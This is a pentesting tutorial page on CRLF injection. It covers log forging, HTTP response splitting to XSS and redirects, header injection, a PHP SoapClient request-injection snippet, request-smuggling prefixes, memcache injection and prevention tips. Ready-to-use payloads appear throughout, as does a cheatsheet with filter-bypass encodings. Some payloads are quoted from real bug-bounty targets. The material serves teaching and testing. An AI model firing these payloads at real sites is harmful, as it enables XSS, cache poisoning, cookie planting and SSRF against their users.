<!DOCTYPE html> <html lang="en"> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title> CRLF (%0D%0A) Injection | 47z!h4Ck </title> <meta name="author" content="47z!Lu7h "> <meta name="description" content=""> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons"> <link rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?591dab5a4e56573bf4ef7fd332894c99" media="" id="highlight_theme_light"> <link href="/assets/css/bootstrap-toc.min.css?6f5af0bb9aab25d79b2448143cbeaa88" rel="stylesheet"> <link rel="shortcut icon" href="data:image/svg+xml,&lt;svg%20xmlns=%22http://www.w3.org/2000/svg%22%20viewBox=%220%200%20100%20100%22&gt;&lt;text%20y=%22.9em%22%20font-size=%2290%22&gt;%E2%9A%9B%EF%B8%8F&lt;/text&gt;&lt;/svg&gt;"> <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="canonical" href="https://47z1lu7h.github.io/projects/pentesting-web/2025-01-01-crlf-0d-0a/"> <link rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?5847e5ed4a4568527aa6cfab446049ca" media="none" id="highlight_theme_dark"> <script src="/assets/js/theme.js?0afe9f0ae161375728f7bcc5eb5b4ab4"></script> </head> <body class="fixed-top-nav sticky-bottom-footer"> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top" role="navigation"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/"> 47z!h4Ck </a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">h0m3 </a> </li> <li class="nav-item "> <a class="nav-link" href="/blog/">blog </a> </li> <li class="nav-item active"> <a class="nav-link" href="/projects/">projects <span class="sr-only">(current)</span> </a> </li> <li class="nav-item "> <a class="nav-link" href="/repositories/">repositories </a> </li> <li class="nav-item "> <a class="nav-link" href="/cv/">cv </a> </li> <li class="nav-item "> <a class="nav-link" href="/teaching/">teaching </a> </li> <li class="nav-item "> <a class="nav-link" href="/people/">people </a> </li> <li class="nav-item "> <a class="nav-link" href="/hacking/">hacking </a> </li> <li class="nav-item dropdown "> <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">submenus </a> <div class="dropdown-menu dropdown-menu-right" aria-labelledby="navbarDropdown"> <a class="dropdown-item " href="/publications/">publications</a> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/projects/">projects</a> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/blog/">blog</a> </div> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="fa-solid fa-moon"></i> <i class="fa-solid fa-sun"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5" role="main"> <div class="row"> <div class="col-sm-3"> <nav id="toc-sidebar" class="sticky-top"></nav> </div> <div class="col-sm-9"> <div class="post"> <header class="post-header"> <h1 class="post-title">CRLF (%0D%0A) Injection</h1> <p class="post-description"></p> </header> <article> <h1 id="crlf-0d0a-injection">CRLF (%0D%0A) Injection</h1> <h3 id="crlf">CRLF</h3> <p>Carriage Return (CR) and Line Feed (LF), collectively known as CRLF, are special character sequences used in the HTTP protocol to denote the end of a line or the start of a new one. Web servers and browsers use CRLF to distinguish between HTTP headers and the body of a response. These characters are universally employed in HTTP/1.1 communications across various web server types, such as Apache and Microsoft IIS.</p> <h3 id="crlf-injection-vulnerability">CRLF Injection Vulnerability</h3> <p>CRLF injection involves the insertion of CR and LF characters into user-supplied input. This action misleads the server, application, or user into interpreting the injected sequence as the end of one response and the beginning of another. While these characters are not inherently harmful, their misuse can lead to HTTP response splitting and other malicious activities.</p> <h3 id="example-crlf-injection-in-a-log-file">Example: CRLF Injection in a Log File</h3> <p><a href="https://www.invicti.com/blog/web-security/crlf-http-header/" rel="external nofollow noopener" target="_blank">Example from here</a></p> <p>Consider a log file in an admin panel that follows the format: <code class="language-plaintext highlighter-rouge">IP - Time - Visited Path</code>. A typical entry might look like:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>123.123.123.123 - 08:15 - /index.php?page=home
</code></pre></div></div> <p>An attacker can exploit a CRLF injection to manipulate this log. By injecting CRLF characters into the HTTP request, the attacker can alter the output stream and fabricate log entries. For instance, an injected sequence might transform the log entry into:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/index.php?page=home&amp;%0d%0a127.0.0.1 - 08:15 - /index.php?page=home&amp;restrictedaction=edit
</code></pre></div></div> <p>Here, <code class="language-plaintext highlighter-rouge">%0d</code> and <code class="language-plaintext highlighter-rouge">%0a</code> represent the URL-encoded forms of CR and LF. Post-attack, the log would misleadingly display:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>IP - Time - Visited Path

123.123.123.123 - 08:15 - /index.php?page=home&amp;
127.0.0.1 - 08:15 - /index.php?page=home&amp;restrictedaction=edit
</code></pre></div></div> <p>The attacker thus cloaks their malicious activities by making it appear as if the localhost (an entity typically trusted within the server environment) performed the actions. The server interprets the part of the query starting with <code class="language-plaintext highlighter-rouge">%0d%0a</code> as a single parameter, while the <code class="language-plaintext highlighter-rouge">restrictedaction</code> parameter is parsed as another, separate input. The manipulated query effectively mimics a legitimate administrative command: <code class="language-plaintext highlighter-rouge">/index.php?page=home&amp;restrictedaction=edit</code></p> <h3 id="http-response-splitting">HTTP Response Splitting</h3> <h4 id="description">Description</h4> <p>HTTP Response Splitting is a security vulnerability that arises when an attacker exploits the structure of HTTP responses. This structure separates headers from the body using a specific character sequence, Carriage Return (CR) followed by Line Feed (LF), collectively termed as CRLF. If an attacker manages to insert a CRLF sequence into a response header, they can effectively manipulate the subsequent response content. This type of manipulation can lead to severe security issues, notably Cross-site Scripting (XSS).</p> <h4 id="xss-through-http-response-splitting">XSS through HTTP Response Splitting</h4> <ol> <li>The application sets a custom header like this: <code class="language-plaintext highlighter-rouge">X-Custom-Header: UserInput</code> </li> <li>The application fetches the value for <code class="language-plaintext highlighter-rouge">UserInput</code> from a query parameter, say “user_input”. In scenarios lacking proper input validation and encoding, an attacker can craft a payload that includes the CRLF sequence, followed by malicious content.</li> <li>An attacker crafts a URL with a specially crafted ‘user_input’: <code class="language-plaintext highlighter-rouge">?user_input=Value%0d%0a%0d%0a&lt;script&gt;alert('XSS')&lt;/script&gt;</code> <ul> <li>In this URL, <code class="language-plaintext highlighter-rouge">%0d%0a%0d%0a</code> is the URL-encoded form of CRLFCRLF. It tricks the server into inserting a CRLF sequence, making the server treat the subsequent part as the response body.</li> </ul> </li> <li>The server reflects the attacker’s input in the response header, leading to an unintended response structure where the malicious script is interpreted by the browser as part of the response body.</li> </ol> <h4 id="an-example-of-http-response-splitting-leading-to-redirect">An example of HTTP Response Splitting leading to Redirect</h4> <p>From <a href="https://medium.com/bugbountywriteup/bugbounty-exploiting-crlf-injection-can-lands-into-a-nice-bounty-159525a9cb62" rel="external nofollow noopener" target="_blank">https://medium.com/bugbountywriteup/bugbounty-exploiting-crlf-injection-can-lands-into-a-nice-bounty-159525a9cb62</a></p> <p>Browser to:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/%0d%0aLocation:%20http://myweb.com
</code></pre></div></div> <p>And the server responses with the header:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Location: http://myweb.com
</code></pre></div></div> <p><strong>Other example: (from</strong> <a href="https://www.acunetix.com/websitesecurity/crlf-injection/" rel="external nofollow noopener" target="_blank"><strong>https://www.acunetix.com/websitesecurity/crlf-injection/</strong></a><strong>)</strong></p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://www.example.com/somepage.php?page=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E
</code></pre></div></div> <h4 id="in-url-path">In URL Path</h4> <p>You can send the payload <strong>inside the URL path</strong> to control the <strong>response</strong> from the server (example from <a href="https://hackerone.com/reports/192667" rel="external nofollow noopener" target="_blank">here</a>):</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://stagecafrstore.starbucks.com/%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E
http://stagecafrstore.starbucks.com/%3f%0D%0ALocation://x:1%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3a0%0D%0A%0D%0A%3Cscript%3Ealert(document.domain)%3C/script%3E
</code></pre></div></div> <p>Check more examples in:</p> <p>https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/crlf.md</p> <h3 id="http-header-injection">HTTP Header Injection</h3> <p>HTTP Header Injection, often exploited through CRLF (Carriage Return and Line Feed) injection, allows attackers to insert HTTP headers. This can undermine security mechanisms such as XSS (Cross-Site Scripting) filters or the SOP (Same-Origin Policy), potentially leading to unauthorized access to sensitive data, such as CSRF tokens, or the manipulation of user sessions through cookie planting.</p> <h4 id="exploiting-cors-via-http-header-injection">Exploiting CORS via HTTP Header Injection</h4> <p>An attacker can inject HTTP headers to enable CORS (Cross-Origin Resource Sharing), bypassing the restrictions imposed by SOP. This breach allows scripts from malicious origins to interact with resources from a different origin, potentially accessing protected data.</p> <h4 id="ssrf-and-http-request-injection-via-crlf">SSRF and HTTP Request Injection via CRLF</h4> <p>CRLF injection can be utilized to craft and inject an entirely new HTTP request. A notable example of this is the vulnerability in PHP’s <code class="language-plaintext highlighter-rouge">SoapClient</code> class, specifically within the <code class="language-plaintext highlighter-rouge">user_agent</code> parameter. By manipulating this parameter, an attacker can insert additional headers and body content, or even inject a new HTTP request entirely. Below is a PHP example demonstrating this exploitation:</p> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$target</span> <span class="o">=</span> <span class="s1">'http://127.0.0.1:9090/test'</span><span class="p">;</span>
<span class="nv">$post_string</span> <span class="o">=</span> <span class="s1">'variable=post value'</span><span class="p">;</span>
<span class="nv">$crlf</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
    <span class="s1">'POST /proxy HTTP/1.1'</span><span class="p">,</span>
    <span class="s1">'Host: local.host.htb'</span><span class="p">,</span>
    <span class="s1">'Cookie: PHPSESSID=[PHPSESSID]'</span><span class="p">,</span>
    <span class="s1">'Content-Type: application/x-www-form-urlencoded'</span><span class="p">,</span>
    <span class="s1">'Content-Length: '</span><span class="mf">.</span><span class="p">(</span><span class="n">string</span><span class="p">)</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$post_string</span><span class="p">),</span>
    <span class="s2">"</span><span class="se">\r\n</span><span class="s2">"</span><span class="p">,</span>
    <span class="nv">$post_string</span>
<span class="p">);</span>

<span class="nv">$client</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">SoapClient</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span>
    <span class="k">array</span><span class="p">(</span>
        <span class="s1">'uri'</span><span class="o">=&gt;</span><span class="nv">$target</span><span class="p">,</span>
        <span class="s1">'location'</span><span class="o">=&gt;</span><span class="nv">$target</span><span class="p">,</span>
        <span class="s1">'user_agent'</span><span class="o">=&gt;</span><span class="s2">"IGN</span><span class="se">\r\n\r\n</span><span class="s2">"</span><span class="mf">.</span><span class="nb">join</span><span class="p">(</span><span class="s2">"</span><span class="se">\r\n</span><span class="s2">"</span><span class="p">,</span><span class="nv">$crlf</span><span class="p">)</span>
    <span class="p">)</span>
<span class="p">);</span>

<span class="c1"># Put a netcat listener on port 9090</span>
<span class="nv">$client</span><span class="o">-&gt;</span><span class="nf">__soapCall</span><span class="p">(</span><span class="s2">"test"</span><span class="p">,</span> <span class="p">[]);</span>
</code></pre></div></div> <h3 id="header-injection-to-request-smuggling">Header Injection to Request Smuggling</h3> <p>For more info about this technique and potential problems <a href="https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning" rel="external nofollow noopener" target="_blank"><strong>check the original source</strong></a>.</p> <p>You can inject essential headers to ensure the <strong>back-end keeps the connection open</strong> after responding to the initial request:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0a HTTP/1.1
</code></pre></div></div> <p>Afterward, a second request can be specified. This scenario typically involves <a href="http-request-smuggling/">HTTP request smuggling</a>, a technique where extra headers or body elements appended by the server post-injection can lead to various security exploits.</p> <p><strong>Exploitation:</strong></p> <ol> <li> <strong>Malicious Prefix Injection</strong>: This method involves poisoning the next user’s request or a web cache by specifying a malicious prefix. An example of this is:</li> </ol> <p><code class="language-plaintext highlighter-rouge">GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/redirplz%20HTTP/1.1%0d%0aHost:%20oastify.com%0d%0a%0d%0aContent-Length:%2050%0d%0a%0d%0a HTTP/1.1</code></p> <ol> <li> <strong>Crafting a Prefix for Response Queue Poisoning</strong>: This approach involves creating a prefix that, when combined with trailing junk, forms a complete second request. This can trigger response queue poisoning. An example is:</li> </ol> <p><code class="language-plaintext highlighter-rouge">GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/%20HTTP/1.1%0d%0aFoo:%20bar HTTP/1.1</code></p> <h3 id="memcache-injection">Memcache Injection</h3> <p>Memcache is a <strong>key-value store that uses a clear text protocol</strong>. More info in:</p> <p>../network-services-pentesting/11211-memcache/</p> <p><strong>For the full information read the</strong><a href="https://www.sonarsource.com/blog/zimbra-mail-stealing-clear-text-credentials-via-memcache-injection/" rel="external nofollow noopener" target="_blank"> <strong>original writeup</strong></a></p> <p>If a platform is taking <strong>data from an HTTP request and using it without sanitizing</strong> it to perform <strong>requests</strong> to a <strong>memcache</strong> server, an attacker could abuse this behaviour to <strong>inject new memcache commands</strong>.</p> <p>For example, in the original discovered vuln, cache keys were used to return the IP and port a user shuold connect to, and attackers were able to <strong>inject memcache comands</strong> that would <strong>poison</strong> the <strong>cache to send the vistims details</strong> (usrnames and passwords included) to the attacker servers:</p> <figure><img src="../images/image%20(659).png" alt="https://assets-eu-01.kc-usercontent.com/d0f02280-9dfb-0116-f970-137d713003b6/ba72cd16-2ca0-447b-aa70-5cde302a0b88/body-578d9f9f-1977-4e34-841c-ad870492328f_10.png?w=1322&amp;h=178&amp;auto=format&amp;fit=crop"><figcaption></figcaption></figure> <p>Moreover, researchers also discovered that they could desync the memcache responses to send the attackers ip and ports to users whose email the attacker didn’t know:</p> <figure><img src="../images/image%20(637).png" alt="https://assets-eu-01.kc-usercontent.com/d0f02280-9dfb-0116-f970-137d713003b6/c6c1f3c4-d244-4bd9-93f7-2c88f139acfa/body-3f9ceeb9-3d6b-4867-a23f-e0e50a46a2e9_14.png?w=1322&amp;h=506&amp;auto=format&amp;fit=crop"><figcaption></figcaption></figure> <h3 id="how-to-prevent-crlf--http-header-injections-in-web-applications">How to Prevent CRLF / HTTP Header Injections in Web Applications</h3> <p>To mitigate the risks of CRLF (Carriage Return and Line Feed) or HTTP Header Injections in web applications, the following strategies are recommended:</p> <ol> <li> <strong>Avoid Direct User Input in Response Headers:</strong> The safest approach is to refrain from incorporating user-supplied input directly into response headers.</li> <li> <strong>Encode Special Characters:</strong> If avoiding direct user input is not feasible, ensure to employ a function dedicated to encoding special characters like CR (Carriage Return) and LF (Line Feed). This practice prevents the possibility of CRLF injection.</li> <li> <strong>Update Programming Language:</strong> Regularly update the programming language used in your web applications to the latest version. Opt for a version that inherently disallows the injection of CR and LF characters within functions tasked with setting HTTP headers.</li> </ol> <h3 id="cheatsheet">CHEATSHEET</h3> <p><a href="https://twitter.com/NinadMishra5/status/1650080604174667777" rel="external nofollow noopener" target="_blank">Cheatsheet from here</a></p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1. HTTP Response Splitting
• /%0D%0ASet-Cookie:mycookie=myvalue (Check if the response is setting this cookie)

2. CRLF chained with Open Redirect
• //www.google.com/%2F%2E%2E%0D%0AHeader-Test:test2
• /www.google.com/%2E%2E%2F%0D%0AHeader-Test:test2
• /google.com/%2F..%0D%0AHeader-Test:test2
• /%0d%0aLocation:%20http://example.com

3. CRLF Injection to XSS
• /%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23
• /%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E

4. Filter Bypass
• %E5%98%8A = %0A = \u560a
• %E5%98%8D = %0D = \u560d
• %E5%98%BE = %3E = \u563e (&gt;)
• %E5%98%BC = %3C = \u563c (&lt;)
• Payload = %E5%98%8A%E5%98%8DSet-Cookie:%20test
</code></pre></div></div> <h2 id="automatic-tools">Automatic Tools</h2> <ul> <li><a href="https://github.com/Raghavd3v/CRLFsuite" rel="external nofollow noopener" target="_blank">https://github.com/Raghavd3v/CRLFsuite</a></li> <li><a href="https://github.com/dwisiswant0/crlfuzz" rel="external nofollow noopener" target="_blank">https://github.com/dwisiswant0/crlfuzz</a></li> </ul> <h2 id="brute-force-detection-list">Brute-Force Detection List</h2> <ul> <li><a href="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/crlf.txt" rel="external nofollow noopener" target="_blank">https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/crlf.txt</a></li> </ul> <h2 id="references">References</h2> <ul> <li><a href="https://www.invicti.com/blog/web-security/crlf-http-header/" rel="external nofollow noopener" target="_blank"><strong>https://www.invicti.com/blog/web-security/crlf-http-header/</strong></a></li> <li><a href="https://www.acunetix.com/websitesecurity/crlf-injection/" rel="external nofollow noopener" target="_blank"><strong>https://www.acunetix.com/websitesecurity/crlf-injection/</strong></a></li> <li><a href="https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning" rel="external nofollow noopener" target="_blank"><strong>https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning</strong></a></li> <li><a href="https://www.netsparker.com/blog/web-security/crlf-http-header/" rel="external nofollow noopener" target="_blank"><strong>https://www.netsparker.com/blog/web-security/crlf-http-header/</strong></a></li> </ul> </article> </div> </div> </div> </div> <footer class="sticky-bottom mt-5" role="contentinfo"> <div class="container"> © Copyright 2025 47z!Lu7h . Love is life. And if you miss love, you miss life. </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@4/imagesloaded.pkgd.min.js"></script> <script defer src="/assets/js/masonry.js" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?85ddb88934d28b74e78031fd54cf8308"></script> <script defer src="/assets/js/bootstrap-toc.min.js?c82ff4de8b0955d6ff14f5b05eed7eb6"></script> <script src="/assets/js/no_defer.js?2930004b8d7fcd0a8e00fdcfc8fc9f24"></script> <script defer src="/assets/js/common.js?4a129fbf39254905f505c7246e641eaf"></script> <script defer src="/assets/js/copy_code.js?12775fdf7f95e901d7119054556e495f" type="text/javascript"></script> <script async src="https://d1bxh8uas1mnw7.cloudfront.net/assets/embed.js"></script> <script async src="https://badge.dimensions.ai/badge.js"></script> <script type="text/javascript">window.MathJax={tex:{tags:"ams"}};</script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js"></script> <script defer src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script type="text/javascript">function progressBarSetup(){"max"in document.createElement("progress")?(initializeProgressElement(),$(document).on("scroll",function(){progressBar.attr({value:getCurrentScrollPosition()})}),$(window).on("resize",initializeProgressElement)):(resizeProgressBar(),$(document).on("scroll",resizeProgressBar),$(window).on("resize",resizeProgressBar))}function getCurrentScrollPosition(){return $(window).scrollTop()}function initializeProgressElement(){let e=$("#navbar").outerHeight(!0);$("body").css({"padding-top":e}),$("progress-container").css({"padding-top":e}),progressBar.css({top:e}),progressBar.attr({max:getDistanceToScroll(),value:getCurrentScrollPosition()})}function getDistanceToScroll(){return $(document).height()-$(window).height()}function resizeProgressBar(){progressBar.css({width:getWidthPercentage()+"%"})}function getWidthPercentage(){return getCurrentScrollPosition()/getDistanceToScroll()*100}const progressBar=$("#progress");window.onload=function(){setTimeout(progressBarSetup,50)};</script> </body> </html>